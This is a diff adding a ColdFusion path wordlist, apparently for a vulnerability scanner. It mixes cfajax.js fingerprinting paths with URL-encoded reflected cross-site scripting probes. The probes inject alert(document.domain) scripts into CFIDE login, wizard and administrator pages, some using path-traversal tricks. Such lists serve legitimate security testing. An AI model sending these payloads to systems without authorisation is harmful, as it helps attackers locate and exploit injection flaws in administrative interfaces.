@@ -1,0 +1,14 @@
+/CFIDE/wizards/common/_logintowizard.cfm?%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/cf_scripts/scripts/ajax/package/cfajax.js
+/cf-scripts/scripts/ajax/package/cfajax.js
+/CFIDE/scripts/ajax/package/cfajax.js
+/cfide/scripts/ajax/package/cfajax.js
+/CF_SFSD/scripts/ajax/package/cfajax.js
+/cfide-scripts/ajax/package/cfajax.js
+/cfmx/CFIDE/scripts/ajax/package/cfajax.js
+/{{string}}
+//{{string}}
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
